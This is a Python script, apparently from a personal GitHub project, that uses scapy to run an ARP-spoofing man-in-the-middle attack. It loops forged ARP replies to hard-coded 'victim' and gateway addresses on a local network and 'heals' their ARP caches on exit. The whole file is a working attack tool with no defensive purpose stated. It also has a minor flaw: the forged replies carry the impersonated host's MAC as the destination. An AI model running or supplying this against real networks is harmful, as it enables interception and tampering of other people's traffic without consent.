from scapy.config import conf
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp, send
from time import sleep

__author__ = "nichil"
__date__ = "12.04.2020"
__github__ = "https://github.com/starvis"


def main():
    conf.verb = False
    spoof_ip = "192.168.130.2"
    spoof_mac = get_mac(spoof_ip)
    victim_ip = "192.168.130.129"
    victim_mac = get_mac(victim_ip)

    try:
        print("Sending spoofed arp")
        while True:
            spoof(victim_ip=victim_ip, spoof_ip=spoof_ip, sppof_mac=spoof_mac)
            spoof(victim_ip=spoof_ip, spoof_ip=victim_ip, sppof_mac=victim_mac)
            sleep(1)

    except KeyboardInterrupt:
        print("Healing victim")
        heal_victim(victim_ip, victim_mac, spoof_ip, spoof_mac)
        heal_victim(spoof_ip, spoof_mac, victim_ip, victim_mac)


def heal_victim(tip, tmac, sip, smac):
    packet = ARP(op="is-at", pdst=tip, hwdst=tmac, psrc=sip, hwsrc=smac)
    send(packet)


def spoof(victim_ip, spoof_ip, sppof_mac):
    faulty_arp_reply = ARP(op="is-at", psrc=spoof_ip, pdst=victim_ip, hwdst=sppof_mac)
    send(faulty_arp_reply)


def get_mac(ip):
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip)
    arp_broadcast_response = srp(arp_broadcast)
    return arp_broadcast_response[0][0][1].hwsrc


if __name__ == "__main__":
    main()
